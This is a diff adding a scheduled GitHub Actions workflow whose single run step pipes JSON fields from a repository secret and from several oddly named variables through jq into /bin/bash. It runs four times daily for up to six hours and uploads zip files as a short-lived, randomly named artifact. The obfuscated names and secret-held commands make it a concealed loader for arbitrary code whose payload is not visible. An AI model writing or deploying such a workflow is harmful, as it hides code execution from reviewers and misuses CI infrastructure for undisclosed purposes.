@@ -1,0 +1,43 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '20 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          viut4: ${{ secrets.viut4 }}
+        run: |
+          printf '%s' "$viut4" | jq -r .yshiq161 | /bin/bash
+          echo $jlffb2393 | jq -r .cxu065 | /bin/bash
+          printf '%s' "$q13974" | jq -r .msoc3 | /bin/bash
+          printf '%s' "$cw7" | jq -r .pd8 | /bin/bash
+          printf '%s' "$gqcj7" | jq -r .vg5376 | /bin/bash
+          printf '%s' "$p3" | jq -r .tfsi0571 | /bin/bash
+          echo $v00580 | jq -r .e53 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: k8V0gUHa
+          path: "*.zip"
+          retention-days: 1
